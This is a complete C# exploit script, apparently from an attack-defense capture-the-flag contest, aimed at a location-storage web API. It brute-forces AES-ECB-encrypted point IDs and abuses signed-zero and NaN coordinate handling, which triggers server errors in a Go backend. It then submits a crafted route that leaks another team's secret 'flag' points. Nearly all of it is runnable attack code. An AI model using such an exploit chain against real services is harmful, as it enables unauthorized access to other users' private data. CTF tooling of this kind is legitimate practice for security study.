using System.Net;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Text.RegularExpressions;

var baseUri = new Uri(args[0]);
var jsonOptions = new JsonSerializerOptions
{
    PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
    DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull
};

State state;
HttpClient cookieClient;
CookieContainer cookies;

await using var stateStream = new FileStream("state.json", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.Read);
if(stateStream.Length > 0)
    state = (await JsonSerializer.DeserializeAsync<State>(stateStream, jsonOptions))!;
else
{
    await ColoredWriteLineAsync(Console.Error, "Brute force some points to find first/last ordered AES-ECB-encrypted UUID values...");

    var noCookieClient = new HttpClient(new HttpClientHandler { UseCookies = false }) { BaseAddress = baseUri };
    var cookieRegex = new Regex(@"\bauth=[^;\s]*", RegexOptions.Compiled | RegexOptions.IgnoreCase | RegexOptions.CultureInvariant);
    var values = await Enumerable.Range(0, 100)
        .ToAsyncEnumerable()
        .Select(async _ =>
        {
            using var resp = (await noCookieClient.SendAsync(new HttpRequestMessage(HttpMethod.Get, "/api/auth?lat=0.0&long=0.0"))).EnsureSuccessStatusCode();
            if(!resp.Headers.TryGetValues("Set-Cookie", out var cks))
                throw new Exception("'auth' cookie not found");
            var match = cks.Select(cookie => cookieRegex.Match(cookie)).FirstOrDefault(match => match.Success);
            if(match == null)
                throw new Exception("'auth' cookie not found");
            return (Id: await resp.Content.ReadAsStringAsync(), Cookie: match.Value);
        })
        .ToDictionaryAwaitAsync(async task => (await task).Id, async task => (await task).Cookie);

    var min = values.MinBy(pair => pair.Key, StringComparer.Ordinal);
    var max = values.MaxBy(pair => pair.Key, StringComparer.Ordinal);

    await ColoredWriteLineAsync(Console.Error, "       Last Point: " + max.Key, ConsoleColor.White);
    await ColoredWriteLineAsync(Console.Error, "Last Point Cookie: " + max.Value, ConsoleColor.Magenta);

    cookies = new CookieContainer();
    cookies.SetCookies(baseUri, min.Value);
    cookieClient = new HttpClient(new HttpClientHandler { UseCookies = true, CookieContainer = cookies }) { BaseAddress = baseUri };

    // Add positive zero point
    var p1PositiveZero = await PutAndReadStringAsync(cookieClient, new Place {Lat = 0.1337, Long = 0.0, Public = "pwn", Secret = "pwn"});
    await ColoredWriteLineAsync(Console.Error, " Positive zero [1]: " + p1PositiveZero, ConsoleColor.White);

    // Add negative zero point with the same other coord
    var p2NegativeZero = await PutAndReadStringAsync(cookieClient, new Place {Lat = 0.1337, Long = -0.0, Public = "pwn", Secret = "pwn"});
    await ColoredWriteLineAsync(Console.Error, " Negative zero [2]: " + p2NegativeZero, ConsoleColor.White);

    cookies = new CookieContainer();
    cookies.SetCookies(baseUri, max.Value);
    cookieClient = new HttpClient(new HttpClientHandler {UseCookies = true, CookieContainer = cookies}) {BaseAddress = baseUri};

    await ColoredWriteLineAsync(Console.Error, "Brute force NaN points...");

    // Add some random point to start brute force from
    var point = await PutAndReadStringAsync(cookieClient, new Place {Lat = 0.1337, Long = 0.1337, Public = "pwn", Secret = "pwn"});
    var (p5NanPoint, p4SomeOwnedPoint) = await BruteForceNanValueAsync(cookieClient, point);

    // Update non-existent random owned point in order to save it to the database
    p4SomeOwnedPoint = await PutAndReadStringAsync(cookieClient, new PlaceInfoOnly { Public = "pwn", Secret = "pwn" }, p4SomeOwnedPoint);
    await ColoredWriteLineAsync(Console.Error, "  Random point [4]: " + p4SomeOwnedPoint, ConsoleColor.White);

    // Update non-existent NaN point in order to save it to the database
    p5NanPoint = await PutAndReadStringAsync(cookieClient, new PlaceInfoOnly { Public = "pwn", Secret = "pwn" }, p5NanPoint);
    await ColoredWriteLineAsync(Console.Error, "     NaN point [5]: " + p5NanPoint, ConsoleColor.White);

    var p6NanPoint = p5NanPoint;
    await ColoredWriteLineAsync(Console.Error, "Same NaN point [6]: " + p6NanPoint, ConsoleColor.White);

    state = new State { Cookie = max.Value, PositiveZero = p1PositiveZero, NegativeZero = p2NegativeZero, RndBeforeNan = p4SomeOwnedPoint, Nan = p5NanPoint };
    await JsonSerializer.SerializeAsync(stateStream, state, jsonOptions);
}

var p3FlagPoint = args[1];
await ColoredWriteLineAsync(Console.Error, "    Flag point [3]: " + p3FlagPoint, ConsoleColor.White);

cookies = new CookieContainer();
cookies.SetCookies(baseUri, state.Cookie);
cookieClient = new HttpClient(new HttpClientHandler {UseCookies = true, CookieContainer = cookies}) {BaseAddress = baseUri};

var route = new[] { state.PositiveZero, state.NegativeZero, p3FlagPoint, state.RndBeforeNan, state.Nan, state.Nan };
using var response = (await cookieClient.PostAsJsonAsync("/api/route", route, jsonOptions)).EnsureSuccessStatusCode();

await using var stream = response.Content.ReadAsStream();
using var reader = new StreamReader(stream, Encoding.UTF8);

var flagRegex = new Regex(@"^TEAM\d{1,3}_[0-9A-Z]{32}$", RegexOptions.Compiled | RegexOptions.CultureInvariant);
var flagPlace = await ReadLinesAsync(reader)
    .Where(line => line != string.Empty)
    .Select(line => JsonSerializer.Deserialize<Place>(line, jsonOptions))
    .FirstOrDefaultAwaitAsync(place => ValueTask.FromResult(!string.IsNullOrEmpty(place?.Secret) && flagRegex.IsMatch(place.Secret)));

if(flagPlace == null)
    throw new Exception("SERVICE NOT PWNABLE :(");

await ColoredWriteLineAsync(Console.Out, flagPlace.Secret ?? "n/a", ConsoleColor.Magenta);
return 0;

// IEEE-754: NaN values are encoded as 's111 1111 1111 1xxx ...' with 11 bits after sign-bit set to '1'
// So we have to brute force AES-ECB-encrypted 1024 values of IDs in average to get a point with NaN coord
// GoLang generates an error while serializing f64 NaN value, so expecting '500 Internal Server Error' here
async Task<(string nan, string valid)> BruteForceNanValueAsync(HttpClient client, string seed)
{
    int count = 0;
    var dict = await Enumerable.Range(0, 65536)
        .ToAsyncEnumerable()
        .Select(async idx =>
        {
            await Task.Delay(300); // Request limiting sleep
            var p = seed.Substring(0, 60) + idx.ToString("x4");
            using var resp = await client.GetAsync($"/api/get/place/{p}");
            var c = Interlocked.Increment(ref count);
            if(c % 100 == 0)
                await Console.Error.WriteLineAsync(c.ToString());
            return (Idx: idx, Point: p, Status: resp.StatusCode);
        })
        .TakeWhileAwait(async item => (await item).Idx == 0 || (await item).Status != HttpStatusCode.InternalServerError)
        .ToDictionaryAwaitAsync(async item => (await item).Point, async item => (await item).Status);

    if(dict.Count == 65536)
        throw new Exception("SERVICE NOT PWNABLE :(");

    var nan = seed.Substring(0, 60) + dict.Count.ToString("x4");
    return (nan, dict.FirstOrDefault(item => StringComparer.Ordinal.Compare(item.Key, nan) < 0).Key);
}

async Task<string> PutAndReadStringAsync<T>(HttpClient client, T item, string? id = null)
{
    using var resp = (await client.PutAsync("/api/put/place" + (id == null ? null : '/' + id), JsonContent.Create(item, options: jsonOptions))).EnsureSuccessStatusCode();
    return await resp.Content.ReadAsStringAsync();
}

async IAsyncEnumerable<string> ReadLinesAsync(TextReader rdr)
{
    while(await rdr.ReadLineAsync() is { } line)
        yield return line;
}

async Task ColoredWriteLineAsync(TextWriter writer, string line, ConsoleColor color = ConsoleColor.Gray)
{
    Console.ForegroundColor = color;
    await writer.WriteLineAsync(line);
    Console.ResetColor();
}

class State
{
    public string Cookie { get; set; }
    public string PositiveZero { get; set; }
    public string NegativeZero { get; set; }
    public string RndBeforeNan { get; set; }
    public string Nan { get; set; }
}

class Place
{
    public double Lat { get; set; }
    public double Long { get; set; }
    public string? Public { get; set; }
    public string? Secret { get; set; }
}

class PlaceInfoOnly
{
    public string? Public { get; set; }
    public string? Secret { get; set; }
}
